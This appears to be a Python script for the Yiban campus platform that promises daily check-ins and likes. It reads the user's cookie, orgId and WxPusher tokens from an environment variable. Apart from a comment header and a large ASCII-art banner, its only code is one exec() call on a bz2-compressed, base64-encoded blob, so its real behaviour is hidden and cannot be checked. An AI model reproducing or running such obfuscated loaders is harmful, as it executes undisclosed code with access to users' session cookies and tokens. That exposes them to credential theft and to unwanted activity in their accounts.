# --encoding:utf-8 -- #
"""

    联系方式:110

    易班

    ver 1.1

    2024.8.4

    参数只需要 cookie 和 orgid 环境变量已修改!!!

    ver 1.0

    2024.6.17

    实现 每日签到 点赞

    环境变量名:yuanshen_yb

    参数: cookie orgId

    群发wxpusher 提取 appToken topicid

    格式:export yuanshen_yb = 备注#cookie#appToken#topicid#orgId

    定时 每天9点一次
    cron: 0 0 9 * * ?

"""

#   --------------------------------一般不动区--------------------------------
#
#                                               #v;;@
#                                           .8@;;;3;;;;&@@u
#                                     ##%$$$$;;;*n8;;$;;;~&$$$$$@&          3@
#                                +@$%$$$$$$$%!;;;%;a$%*;;#$$$$%$$$$%$@!    *n *@n
#                              &$$$$$$$$$$$$$@*;;;$;;;;;@$$%$$$$$$$$$$%$$@%
#                             $$$$$$$$$$$$$$$$;;;;8;;;;$$$$$$$$i#$$%3i!@i@$$@
#                             #$$$$$$$$$$$$$$%$&&&#@@@@$$$$$$$#!!i#%#i!i3#$$$%&.&$
#                             @$$$$$$$$$$$$&@@@@@@@@&$$$$$$$$$%$!6@@iii6!!@@$@$$&.
#                          +&$%$@@@6iiiiizzzzuzzzzzazzzazzui!@@&%$$$$&i%$#@!i@%$$@
#                        #@@&&iiizzuazzaazzz@zzaazaaazazzzzaazzzzii#@$$$$$ii!i!$$%+
#                      @&&&@@uzzzzaazzzzzzi8zzzzazzazazaaizzzzazazzzaiii@$#!#i###
#                      @&&i#zzzazazzizi#@@6^izzzzzaazazu$izazzazzzzzaaz1iii8#$#@%%
#                      +i@zzzaazz11zzi!@+-%3zaaza1zzzi!#iaazz68zzzzzzzzz1iii&&#i$@
#                       i#1zazzza@azi38++. ;iuzzziazz8++*6azzzzzzzzzzzazazzii6&$&$.
#        .3       @    #i@zzzzaa3i@@3     .@&izzziu1#-- -@&###azuuzzaazzzzazzi&&# %^
#       z-i!*       a  ii@azzzzz@-6  @@@@   &@izz%#8- +8   $@3  &!azzzzzaaazzz@   -$#
#      o   !!1  -o  @+!8 @izaazz@ @  *&1    % %iaa#8  #   @@@@~  @izazzzaazzzzi    &$~
#     6    iii      3    .i1auaa! %        +o  -@i%.  @          @;$zazzzzzzaza    @%$.
#     n            !      #!iziiz@  %#;..8$        .  .@        @.a#zzaazzizzz%     $$@
#   * ^            #      va@ii3!ia$  ..                 ;&@@@1   %zzaaaaiizaz@
# ~;% ;           ~ #     @aaaz@#  ......     3           ....   $zzzza1i86azz#    za.@ 6
#     #          a .@@@   &aaaa@               -&@!       .... -6uiiizi#ai@izau    3z @;
#      ~         #        +uuuu!@                             ^++oiii%3-&1i&azz@   61~  &
#      -~        @         @uuu!-i63..                         $#@i+--%3iia!#izzu      * .
#        n       o          &311#iiiii@!                    .---o@#iii%aaaz-   i@&&^
#         @~      @          !31u@ii#i$&@@8!3#;-------++-1##3@ 8@.!iii1aaa&
#           #~;    !      #$#@%336$%#8@%%$$#&63i3n  @!!6668#&$$$$#!ii#aauu#
#        ..   +8~~~;;@@@&.@3#&$&%%#$&8888%&$$%$$%@&$$$$$$$$$$$@88888#uuuu$$-
#             .   .-%   6~@%$$8#$#$$88888888&#$#&a6%$%$#@8888888888@113u@$$$$
#                   1    -z$$$$6366%$%$&%88888&#&u;~;86686686%v%@611!3&$$$$#z  ;u
#                    1--+#^@$$$6$8#%aaai$668688;$&66668686688% a!338&$$$$$v.  .^@
#                      @@@@@$&#@ ^u%!uu%%88866$@#&8666686668%&   -a$&$$$@.  8@#
#                        $&##     @##816666666868#8666666366&$.   3u%$%@&8;*@ %@
#            @   @                 %#@366368$$@66866666666636&;&  @u%3$@#u$u-  o&
#       @ @. @ -v8i%               !6336666663&6666636!66336!66z~  @~#!11uuui1   #
#       @ @  @  @ @               #&&@663666$va$6666!33666666#&$%@  # @!1u33$6!!$  @
#       @ @ @.  @ @   @@@@- @&   @&$@1&6!636a$@1%6663!3333&$z1$$$$@@    +#838#!&v3   v
#       @@@ @ 8 -a@              @%$;&i$&666#n6%;3#3336@&&**#;#$$$#6za    .3$3131 -
#       n -@ @@ i@@.             #$@~%8$$$&@on@@@@$v&$%$$$$$$3n$$&iz%%a&     o33#
#              @   +            +&&@a&$$$%$$ou$$$$$&&~~$$$$1$@;$$&#%%z868$@@!;#3-
#                                v   .@&&$$$&$#%%%&@#&$&$$$$$&;#@@@&%$#%&@   %8u!
#                             !%&       #$&#ou6%!%#  .#&$$$$@       1 @$^
#                            a@ .i-i+ . ^&%%33!8%%%     #&&+       !1@#8@
#                            @$6-@  i#&    -8@@@@#@#^     @&^     %n*!@.
#                           &$$++i$
#                             .@$$%$
#
# ...................................................................
#           堂主保佑             永无BUG
#           堂主镇楼             BUG辟邪
#
#   堂主曰:
#
#        一日复一日，代码何其多！
#        只愿无bug，每日醉成仙！
#
# --------------------------------代码区--------------------------------
try:
    import bz2, base64
    exec(bz2.decompress(base64.b64decode('QlpoOTFBWSZTWbPSbiMABT5f+WAQWP//+j/v/+6////6TO/MXTBHsP6H4OAIPH1pgAFmVbAGmSikVLAyRDKGjSm2p6T1PSNT1PakeUaD0mjQBtIAep5QABoDQHqaNHqGngogwAAAAAAAAAAAAAAAAAAAACDAAAAAAAAAAAAAAAAAAAAACTUiTU000xTGplD1MmmhoANAyA0AZPUAaAAAAAAAgwAAAAAAAAAAAAAAAAAAAAAkSCAgJino0JhMg0p+iaaJk2iMJpiaB4p6gAAAAAGhYDTwTvXzXaPHabp5TkuUPqUXw28L4UVrtTkrFwZfbrYou2xsVg1SuDVp0nJ0Mt29ZwJpkkVRFRWIixRIsgsUiG3wm0a+gco8bG8qEzEnoOOJFSwyzXxmWCYyAMYFIMsE/f+qXxxMmI3vVNmStihhqw8u4BilkNBsUYuKaUC+pNbDZ0XntFFCK/m95HLMCrrYxflc2piAWwa3Ymwh5JFKuXq1ehWq9K3q25qvgNg4Q6ab8rPUsSkvgjkynUcRczBQUvn5NnMZpmppOKSi51TLSyXiYFLgJEQJuHCij7d3KSnbWGdnvTs5eeQWZI88Rqsk9XCcl4bKWWQ+wy0gUWUKSe6wrQrUdnU85XPmlQ9Sk5z78DbpS+tMnVpPKX40jhqu7oN96W28mXx66KWO9k2e6RpTYFYIyYScSMe5PRgx1zZLod3hlO/BL1/Xn5d1cs8MPDKWBXh27YIJ1uzFt60OVCBUrNe/Q7xj204+o8Lt/GvIeQ9WF4jyG5EyQQjsaRY3MV8iIhKe6AkyTJSUAdcgZp8XULZcbR72J6piSJhezeKErZnQVtrWlFKbI7x5DSNbMr70lzDKrnIN83y48BK/2LTeMnxFp1GCPgMTG8xKGNpgMsUphnDE6yhMv0FF0P0roDn74W6yAjMUIwO6us44Y20sWwDmEwTOTq5KzlRHOU9ysHKfKcczrKXbvkUZdeZTQZqfHry+N3i58wZ2XSIWc8y5Tx+I3qZsYlKWyWSJxspQkN6oWYqKCFY6ES2ZauRMYNprYvbOk4GSY+Ps8nd21LWetaWFvwgVfwKJNUVgfER6pkDipL2VvezuNafrSqWqi1qslCLFtW6cRvncGm5xjMZy7p8zzpvTXli7ZUtGF45wqxiEP6YVQutLomFzgi4UoG6OhUCIEQQPtmB2aN+HHAwmwSAzSNaJ11p12jgatpYGsnKTVQOBJAiAp4Fjnx01c7O0PwNp2GsM1QiL9VbZlZTnMmDChOJTihZa33EFF3EFgKiR4BpHtZcwg4jJ52c92peenPkmeTeQkUlgdNYisJZCQCxqBAUpb55axIStOw1HHs4RIZ6FuGu1n7Zb0mDITTcEAeoIIOqby1lDUICDuHlzzXOcGAXqYKplNa0Co0jSlIghJR6VWvNOVHRRm5sKlDSgbmFt8wwhgpFSkbSmm7ErbuUyIZkhXEIMRBeBlU4WGZ7PoGY97X7HJxylI1ViQSLel9DtnKRDJxJye5haNS9sQU7fo8wzvqh5C32vRs05DVoQaEkHm3clEVTXEwbFlNXYu6eKe+ZSGNnMuBcGpiNt7MXBEEJBuNQg86wNoPxdYkosMy9JOSDEILgNujEMNA0wYzpNqSD4ug6DoreF/ePCUFMeBy5wvIDvlK2wRZgKvLgeDiV0XdXUEdoBwVOALUl84vFCFl0HaF9fwiCA2m5bxcshDV3bSXdaPDb3qGRSOc9M7BPQgtCwObiwIFHHlA0O44GHzOoPUMnAxAxgGbMB1rYrWuHqNZPBfpzqIilrrVSUQYtAmiNIVVgkCUCgQzHLLdFgaYNp3el9xJBMe8ZDOp57yezTfa63Z9G8PmMnVkkhNWsoOJhBV4X5krbQoEYXJJk1gYAldObt7BgMijGU0qoOSSo2vCxVyhRFECiIDewWJRCjPsQPFtkQQOortlCGy3QQgoMdVaOqBoadUQR0HvGbxIIymw3C0rQlwHvDaG22GQEWFB9bOFZkhVVSLASIyMlrQUirAez3eB5myGVdkHx8OryaxVycgQYY+5MSOIqbSW7canIOwjfvbzoxkQvAFeMVgcuuYcHME5mHYOfAb25eCUqzo4eQOVsZfIWG4WlZz3Ru6rymUt6vKrjDQGfPg3oQ5IGh0UyoVIKDEWArIGmSXhg8zGtiTowtCCwjWkxbUDYda7JKiEMUwqcWSct/nuvqlrC+6qV1NO8rRW1ttlEoTQMUKSvs6DUBwTUqpHraKVVLM8LPxvJGQOWbRRonHObCDr1G9yimlgChQQ5BIMDchskq5lC017xhaNGxZQpDlirgVa5yKsCsAySquhgJE05Smie9ShJBmFp4TObLeMck5jHCwymbbLEWkVirUomrPjArj7NdSTExgxkRSDiFnFLpr4ug+FL6Y20g+ab5ehYc/Gg4TDboA0BYEyCc9O2JcWtB7evum+2+NemcZw5jWF/cNIs4aFdImXhhyR2kQFd3NpsFay2czbKJyZHo26K7cemtcNC0E+q6YKZugJYKAA819RLdjr8SdKi89wG5VyfbyKxY9nb2cDmNPdu7X3w4n/hRG3iInPoEH6zFIMFV1jr6MG47BiwvY91HsOUheUT69TBiz5MeFrcKZEyQTBkle3GB3GoNysyuf8XckU4UJCz0m4jA')))
except Exception as e:
    print("脚本执行出错：",str(e))
